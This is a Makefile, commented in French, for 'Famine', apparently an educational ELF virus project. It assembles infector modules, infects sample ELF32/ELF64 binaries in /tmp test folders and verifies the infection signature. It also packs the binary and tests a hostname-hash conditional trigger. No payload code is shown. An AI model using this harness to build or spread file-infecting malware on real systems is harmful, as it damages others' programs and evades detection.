# =============================================================================
# CONFIGURATION
# =============================================================================

NAME        := Famine
NASM        := nasm
LD          := ld

# Répertoires
SRC_DIR     := src
INC_DIR     := include
BUILD_DIR   := build
TEST_DIR    := test

UMASK		:= 0022
CHMOD_DIR	:= 755
CHMOD_FILE	:= 644
CHMOD_EXEC	:= 755

# Flags - Détection automatique de l'architecture
ARCH := $(shell uname -m)
OS := $(shell uname -s)
ifeq ($(OS),Darwin)
	# Sur macOS, utiliser le format ELF pour compatibilité Linux
	NASM_FLAGS  := -f elf64 -I $(INC_DIR)/
	LD_FLAGS    := -m elf_x86_64
else ifeq ($(ARCH),aarch64)
	# Sur ARM64, on force l'émulation x86-64
	NASM_FLAGS  := -f elf64 -I $(INC_DIR)/
	LD_FLAGS    := -m elf_x86_64
else
	# Sur x86-64 natif
	NASM_FLAGS  := -f elf64 -I $(INC_DIR)/
	LD_FLAGS    := -m elf_x86_64
endif

# Fichiers source
SRCS        := $(SRC_DIR)/famine.asm \
               $(SRC_DIR)/file_ops.asm \
               $(SRC_DIR)/elf_check.asm \
               $(SRC_DIR)/infect.asm \
               $(SRC_DIR)/infect32.asm \
               $(SRC_DIR)/handlers.asm \
               $(SRC_DIR)/control.asm

# Fichiers objets
OBJS        := $(SRCS:$(SRC_DIR)/%.asm=$(BUILD_DIR)/%.o)

# =============================================================================
# COULEURS
# =============================================================================

GREEN       := \033[0;32m
YELLOW      := \033[0;33m
RED         := \033[0;31m
RESET       := \033[0m

# =============================================================================
# RÈGLES PRINCIPALES
# =============================================================================

all: $(BUILD_DIR) $(NAME)

$(BUILD_DIR):
	@umask $(UMASK)
	@mkdir -p $(BUILD_DIR)
	@chmod $(CHMOD_DIR) $(BUILD_DIR)
	@echo "$(GREEN)✓ Répertoire build créé$(RESET)"

$(NAME): $(OBJS)
	@echo "$(YELLOW)→ Linking $(NAME)...$(RESET)"
	@if [ "$(OS)" = "Darwin" ]; then \
		gcc -m64 -nostdlib -static -o $(NAME) $(OBJS); \
	else \
		$(LD) $(LD_FLAGS) -o $(NAME) $(OBJS); \
	fi
	@chmod $(CHMOD_EXEC) $(NAME)
	@echo "$(GREEN)✓ $(NAME) compilé avec succès!$(RESET)"

$(BUILD_DIR)/%.o: $(SRC_DIR)/%.asm
	@echo "$(YELLOW)→ Assemblage de $<...$(RESET)"
	@$(NASM) $(NASM_FLAGS) -o $@ $<
	@chmod $(CHMOD_FILE) $@

# =============================================================================
# RÈGLE D’EXÉCUTION EN DEV
# =============================================================================

run: $(NAME)
	@echo "$(YELLOW)→ Exécution de $(NAME) en tant que dev...$(RESET)"
	@sudo -u dev ./$(NAME)

# =============================================================================
# RÈGLES DE TEST
# =============================================================================

test: all
	@echo "$(YELLOW)→ Préparation de l'environnement de test...$(RESET)"
	@umask $(UMASK)
	@mkdir -p /tmp/test /tmp/test2
	@chmod $(CHMOD_DIR) /tmp/test2
	@echo "$(GREEN)✓ Environnement prêt$(RESET)"
	@echo "$(YELLOW)→ Compilation des binaires de test...$(RESET)"
	@gcc -m64 $(TEST_DIR)/sample.c -o /tmp/test/sample 2>/dev/null || true
	@chmod $(CHMOD_EXEC) /tmp/test/sample 2>/dev/null || true
	@cp /bin/ls /tmp/test2/ls 2>/dev/null || echo "Note: /bin/ls non copié"
	@chmod $(CHMOD_EXEC) /tmp/test2/ls 2>/dev/null || true
	@echo "$(GREEN)✓ Tests préparés$(RESET)"

run-test: test
	@echo "$(YELLOW)→ Vérification avant infection...$(RESET)"
	@/tmp/test/sample 2>/dev/null || true
	@strings /tmp/test/sample | grep -i famine || echo "Pas encore infecté"
	@echo ""
	@echo "$(YELLOW)→ Exécution de Famine...$(RESET)"
	@./$(NAME)
	@echo ""
	@echo "$(YELLOW)→ Vérification après infection...$(RESET)"
	@/tmp/test/sample 2>/dev/null || true
	@strings /tmp/test/sample | grep -i famine && echo "$(GREEN)✓ Signature détectée!$(RESET)" || echo "$(RED)✗ Pas de signature$(RESET)"

# =============================================================================
# RÈGLES DE NETTOYAGE
# =============================================================================

clean:
	@rm -rf $(BUILD_DIR)
	@echo "$(GREEN)✓ Objets nettoyés$(RESET)"

fclean: clean
	@rm -f $(NAME)
	@echo "$(GREEN)✓ Exécutable supprimé$(RESET)"

clean-test:
	@rm -rf /tmp/test /tmp/test2
	@echo "$(GREEN)✓ Environnement de test nettoyé$(RESET)"

re: fclean all

# =============================================================================
# RÈGLES DE PACKING
# =============================================================================

pack: $(NAME)
	@echo "$(YELLOW)→ Packing de $(NAME) avec stub de décompression...$(RESET)"
	@bash scripts/simple_stub_packer.sh $(NAME) $(NAME)_packed
	@echo "$(GREEN)✓ Binaire packé créé: $(NAME)_packed$(RESET)"
	@echo "$(YELLOW)→ Vérification de la signature...$(RESET)"
	@strings $(NAME)_packed | grep -i famine && echo "$(GREEN)✓ Signature accessible$(RESET)" || echo "$(RED)✗ Signature non accessible$(RESET)"
	@echo "$(YELLOW)→ Analyse avec objdump...$(RESET)"
	@objdump -h $(NAME)_packed | head -10
	@echo "$(YELLOW)→ Analyse avec file...$(RESET)"
	@file $(NAME)_packed
	@echo "$(YELLOW)→ Comparaison des tailles:$(RESET)"
	@ls -lh $(NAME) $(NAME)_packed

test-packed: pack
	@echo "$(YELLOW)→ Test d'exécution du binaire packé...$(RESET)"
	@mkdir -p /tmp/test_packed
	@cp /tmp/test_elf64/sample64 /tmp/test_packed/ 2>/dev/null || true
	@cp /tmp/test_elf32/sample32 /tmp/test_packed/ 2>/dev/null || true
	@echo "$(YELLOW)→ Exécution de Famine packé...$(RESET)"
	@./$(NAME)_packed
	@echo "$(YELLOW)→ Vérification des infections...$(RESET)"
	@strings /tmp/test_packed/sample64 | grep -i famine && echo "$(GREEN)✓ Infection ELF64 réussie$(RESET)" || echo "$(RED)✗ Infection ELF64 échouée$(RESET)"
	@strings /tmp/test_packed/sample32 | grep -i famine && echo "$(GREEN)✓ Infection ELF32 réussie$(RESET)" || echo "$(RED)✗ Infection ELF32 échouée$(RESET)"

# =============================================================================
# RÈGLES D'INSPECTION
# =============================================================================

inspect: all
	@echo "$(YELLOW)→ Informations sur $(NAME):$(RESET)"
	@file $(NAME)
	@echo ""
	@readelf -h $(NAME) | grep -A 3 "ELF Header"
	@echo ""
	@ls -lh $(NAME)

objdump: all
	@objdump -d -M intel $(NAME)

hexdump: all
	@od -t x1 -A x $(NAME)

# =============================================================================
# AIDE
# =============================================================================

help:
	@echo "$(GREEN)Famine - Makefile d'aide$(RESET)"
	@echo ""
	@echo "Cibles principales:"
	@echo "  $(YELLOW)all$(RESET)         - Compile le projet"
	@echo "  $(YELLOW)run$(RESET)         - Exécute le binaire en tant que dev"
	@echo "  $(YELLOW)test$(RESET)        - Prépare l'environnement de test"
	@echo "  $(YELLOW)run-test$(RESET)    - Exécute les tests"
	@echo "  $(YELLOW)clean$(RESET)       - Nettoie les fichiers objets"
	@echo "  $(YELLOW)fclean$(RESET)      - Nettoie tout"
	@echo "  $(YELLOW)re$(RESET)          - Recompile"
	@echo ""
	@echo "Tests ELF:"
	@echo "  $(YELLOW)test-elf64$(RESET)  - Test complet ELF64"
	@echo "  $(YELLOW)test-elf32$(RESET)  - Test complet ELF32"
	@echo "  $(YELLOW)test-nonbin$(RESET) - Test fichiers non-binaires"
	@echo "  $(YELLOW)test-all$(RESET)    - Test complet ELF32 + ELF64 + non-binaires"
	@echo ""
	@echo "Tests Bonus 2 (Déclenchement conditionnel):"
	@echo "  $(YELLOW)test-condition$(RESET)        - Test simple du déclenchement"
	@echo "  $(YELLOW)test-condition-full$(RESET)  - Test complet avec Docker"
	@echo "  $(YELLOW)test-condition-debug$(RESET) - Test avec FAMINE_FORCE=1"
	@echo "  $(YELLOW)test-condition-normal$(RESET) - Test condition normale"
	@echo "  $(YELLOW)calculate-hostname-hash$(RESET) - Calcul du hash du hostname"
	@echo ""
	@echo "Docker (pour macOS):"
	@echo "  $(YELLOW)docker-build$(RESET)         - Compilation dans Docker"
	@echo "  $(YELLOW)docker-test-condition$(RESET) - Test conditionnel dans Docker"
	@echo ""
	@echo "Packing:"
	@echo "  $(YELLOW)pack$(RESET)        - Compresse Famine avec LZ"
	@echo "  $(YELLOW)test-packed$(RESET) - Test du binaire packé"
	@echo ""
	@echo "Cibles d'inspection:"
	@echo "  $(YELLOW)inspect$(RESET)     - Affiche des infos sur le binaire"
	@echo "  $(YELLOW)objdump$(RESET)     - Désassemble le binaire"
	@echo "  $(YELLOW)hexdump$(RESET)     - Affiche le contenu hexadécimal"

# =============================================================================
# TESTS ELF32/ELF64
# =============================================================================

test-elf64: $(NAME)
	@echo "$(BLUE)=== Test ELF64 ===$(RESET)"
	@mkdir -p /tmp/test_elf64
	@echo "$(YELLOW)→ Création du programme de test ELF64...$(RESET)"
	@echo '#include <stdio.h>' > /tmp/test_elf64/sample64.c
	@echo 'int main() { printf("Hello from ELF64!\\n"); return 0; }' >> /tmp/test_elf64/sample64.c
	@echo "$(YELLOW)→ Compilation ELF64...$(RESET)"
	@gcc -m64 -static -o /tmp/test_elf64/sample64 /tmp/test_elf64/sample64.c
	@echo "$(GREEN)✓ Binaire ELF64 créé$(RESET)"
	@echo "$(YELLOW)→ Vérification du format...$(RESET)"
	@readelf -h /tmp/test_elf64/sample64 | grep "Class:.*ELF64" && echo "$(GREEN)✓ Format ELF64 confirmé$(RESET)" || echo "$(RED)✗ Format ELF64 incorrect$(RESET)"
	@echo "$(YELLOW)→ Test d'exécution avant infection...$(RESET)"
	@/tmp/test_elf64/sample64 && echo "$(GREEN)✓ Exécution ELF64 réussie$(RESET)" || echo "$(RED)✗ Échec exécution ELF64$(RESET)"
	@echo "$(YELLOW)→ Copie vers /tmp/test pour Famine...$(RESET)"
	@mkdir -p /tmp/test
	@cp /tmp/test_elf64/sample64 /tmp/test/
	@echo "$(YELLOW)→ Création du fichier de force pour activation...$(RESET)"
	@touch /tmp/famine_force
	@echo "$(YELLOW)→ Infection avec Famine...$(RESET)"
	@./$(NAME)
	@echo "$(YELLOW)→ Suppression du fichier de force...$(RESET)"
	@rm -f /tmp/famine_force
	@echo "$(YELLOW)→ Copie vers /tmp/test_elf64...$(RESET)"
	@cp /tmp/test/sample64 /tmp/test_elf64/
	@echo "$(YELLOW)→ Vérification de l'infection...$(RESET)"
	@strings /tmp/test_elf64/sample64 | grep "Famine" && echo "$(GREEN)✓ Infection ELF64 réussie!$(RESET)" || echo "$(RED)✗ Infection ELF64 échouée$(RESET)"
	@echo "$(YELLOW)→ Test d'exécution après infection...$(RESET)"
	@/tmp/test_elf64/sample64 && echo "$(GREEN)✓ Exécution post-infection réussie$(RESET)" || echo "$(RED)✗ Échec exécution post-infection$(RESET)"
	@echo "$(GREEN)=== Test ELF64 terminé ===$(RESET)"

test-elf32: $(NAME)
	@echo "$(BLUE)=== Test ELF32 ===$(RESET)"
	@mkdir -p /tmp/test_elf32
	@echo "$(YELLOW)→ Création du programme de test ELF32...$(RESET)"
	@echo '#include <stdio.h>' > /tmp/test_elf32/sample32.c
	@echo 'int main() { printf("Hello from ELF32!\\n"); return 0; }' >> /tmp/test_elf32/sample32.c
	@echo "$(YELLOW)→ Compilation ELF32...$(RESET)"
	@chmod +x scripts/simple_elf32_test.sh
	@./scripts/simple_elf32_test.sh
	@echo "$(GREEN)✓ Binaire ELF32 créé$(RESET)"
	@echo "$(YELLOW)→ Vérification du format...$(RESET)"
	@readelf -h /tmp/test_elf32/sample32 | grep "Class:.*ELF32" && echo "$(GREEN)✓ Format ELF32 confirmé$(RESET)" || echo "$(RED)✗ Format ELF32 incorrect$(RESET)"
	@echo "$(YELLOW)→ Test d'exécution avant infection...$(RESET)"
	@if command -v qemu-i386 >/dev/null 2>&1; then \
		qemu-i386 /tmp/test_elf32/sample32 && echo "$(GREEN)✓ Exécution ELF32 réussie$(RESET)" || echo "$(RED)✗ Échec exécution ELF32$(RESET)"; \
	else \
		echo "$(YELLOW)→ qemu-i386 non disponible, test direct...$(RESET)"; \
		/tmp/test_elf32/sample32 2>/dev/null && echo "$(GREEN)✓ Exécution ELF32 réussie$(RESET)" || echo "$(YELLOW)→ Exécution directe échouée (normal sur système 64-bit)$(RESET)"; \
	fi
	@echo "$(YELLOW)→ Copie vers /tmp/test2 pour Famine...$(RESET)"
	@mkdir -p /tmp/test2
	@cp /tmp/test_elf32/sample32 /tmp/test2/
	@echo "$(YELLOW)→ Création du fichier de force pour activation...$(RESET)"
	@touch /tmp/famine_force
	@echo "$(YELLOW)→ Infection avec Famine...$(RESET)"
	@./$(NAME)
	@echo "$(YELLOW)→ Suppression du fichier de force...$(RESET)"
	@rm -f /tmp/famine_force
	@echo "$(YELLOW)→ Copie vers /tmp/test_elf32...$(RESET)"
	@cp /tmp/test2/sample32 /tmp/test_elf32/
	@echo "$(YELLOW)→ Vérification de l'infection...$(RESET)"
	@strings /tmp/test_elf32/sample32 | grep "Famine" && echo "$(GREEN)✓ Infection ELF32 réussie!$(RESET)" || echo "$(RED)✗ Infection ELF32 échouée$(RESET)"
	@echo "$(YELLOW)→ Test d'exécution après infection...$(RESET)"
	@if command -v qemu-i386 >/dev/null 2>&1; then \
		qemu-i386 /tmp/test_elf32/sample32 && echo "$(GREEN)✓ Exécution post-infection réussie$(RESET)" || echo "$(RED)✗ Échec exécution post-infection$(RESET)"; \
	else \
		echo "$(YELLOW)→ qemu-i386 non disponible pour test post-infection$(RESET)"; \
	fi
	@echo "$(GREEN)=== Test ELF32 terminé ===$(RESET)"

test-nonbin: $(NAME)
	@echo "$(BLUE)=== Test fichiers non-binaires ===$(RESET)"
	@echo "$(YELLOW)→ Exécution du script de test...$(RESET)"
	@chmod +x scripts/test_nonbin.sh
	@$(CURDIR)/scripts/test_nonbin.sh
	@echo "$(GREEN)=== Test fichiers non-binaires terminé ===$(RESET)"

test-all: test-elf64 test-elf32 test-nonbin
	@echo "$(PURPLE)=== Tests complets terminés ===$(RESET)"

# =============================================================================
# TESTS BONUS 2 - DÉCLENCHEMENT CONDITIONNEL
# =============================================================================

test-condition: $(NAME)
	@echo "$(BLUE)=== Test du déclenchement conditionnel ===$(RESET)"
	@echo "$(YELLOW)→ Test simple du déclenchement conditionnel...$(RESET)"
	@chmod +x scripts/test_simple_condition.sh
	@./scripts/test_simple_condition.sh
	@echo "$(GREEN)✓ Test simple du déclenchement conditionnel terminé$(RESET)"

test-condition-full: $(NAME)
	@echo "$(BLUE)=== Test complet du déclenchement conditionnel ===$(RESET)"
	@echo "$(YELLOW)→ Test complet avec Docker...$(RESET)"
	@chmod +x scripts/test_condition.sh
	@./scripts/test_condition.sh
	@echo "$(GREEN)✓ Test complet du déclenchement conditionnel terminé$(RESET)"

test-condition-debug: $(NAME)
	@echo "$(BLUE)=== Test debug fichier de force ===$(RESET)"
	@echo "$(YELLOW)→ Test avec fichier de force...$(RESET)"
	@mkdir -p /tmp/test /tmp/test2
	@echo '#include <stdio.h>' > /tmp/test/sample.c
	@echo 'int main() { printf("Hello from test!\\n"); return 0; }' >> /tmp/test/sample.c
	@gcc -m64 -static -o /tmp/test/sample /tmp/test/sample.c
	@echo "$(YELLOW)→ Vérification avant infection...$(RESET)"
	@strings /tmp/test/sample | grep -i famine || echo "Pas encore infecté"
	@echo "$(YELLOW)→ Exécution avec fichier de force...$(RESET)"
	@touch /tmp/famine_force
	@./$(NAME)
	@echo "$(YELLOW)→ Vérification après infection...$(RESET)"
	@strings /tmp/test/sample | grep -i famine && echo "$(GREEN)✓ Infection détectée avec fichier de force$(RESET)" || echo "$(RED)✗ Pas d'infection malgré fichier de force$(RESET)"
	@rm -f /tmp/famine_force
	@echo "$(GREEN)✓ Test debug terminé$(RESET)"

test-condition-normal: $(NAME)
	@echo "$(BLUE)=== Test condition normale (sans FAMINE_FORCE) ===$(RESET)"
	@echo "$(YELLOW)→ Test sans FAMINE_FORCE...$(RESET)"
	@mkdir -p /tmp/test /tmp/test2
	@echo '#include <stdio.h>' > /tmp/test/sample.c
	@echo 'int main() { printf("Hello from test!\\n"); return 0; }' >> /tmp/test/sample.c
	@gcc -m64 -static -o /tmp/test/sample /tmp/test/sample.c
	@echo "$(YELLOW)→ Vérification avant infection...$(RESET)"
	@strings /tmp/test/sample | grep -i famine || echo "Pas encore infecté"
	@echo "$(YELLOW)→ Exécution sans FAMINE_FORCE...$(RESET)"
	@unset FAMINE_FORCE && ./$(NAME)
	@echo "$(YELLOW)→ Vérification après infection...$(RESET)"
	@strings /tmp/test/sample | grep -i famine && echo "$(GREEN)✓ Infection détectée (condition remplie)$(RESET)" || echo "$(YELLOW)→ Pas d'infection (condition non remplie)$(RESET)"
	@echo "$(GREEN)✓ Test condition normale terminé$(RESET)"

calculate-hostname-hash:
	@echo "$(BLUE)=== Calcul du hash du hostname ===$(RESET)"
	@echo "$(YELLOW)→ Calcul du hash pour le hostname actuel...$(RESET)"
	@python3 scripts/calculate_hash.py $(shell hostname)
	@echo "$(GREEN)✓ Hash calculé$(RESET)"

# =============================================================================
# COMPILATION DOCKER (pour macOS)
# =============================================================================

docker-build:
	@echo "$(BLUE)=== Compilation dans Docker ===$(RESET)"
	@echo "$(YELLOW)→ Compilation et test dans Docker...$(RESET)"
	@chmod +x scripts/docker_build.sh
	@./scripts/docker_build.sh
	@echo "$(GREEN)✓ Compilation Docker terminée$(RESET)"

docker-test-condition:
	@echo "$(BLUE)=== Test conditionnel dans Docker ===$(RESET)"
	@echo "$(YELLOW)→ Test du déclenchement conditionnel dans Docker...$(RESET)"
	@if command -v docker >/dev/null 2>&1; then \
		docker run --rm -v "$(PWD):/workspace" ubuntu:20.04 bash -c "cd /workspace && apt-get update && apt-get install -y nasm gcc make && make clean && make all && make test-condition-debug"; \
	else \
		echo "$(RED)✗ Docker non disponible$(RESET)"; \
	fi
	@echo "$(GREEN)✓ Test Docker terminé$(RESET)"

.PHONY: all clean fclean re test run run-test clean-test inspect objdump hexdump help test-elf64 test-elf32 test-nonbin test-all pack test-packed test-condition test-condition-full test-condition-debug test-condition-normal calculate-hostname-hash docker-build docker-test-condition
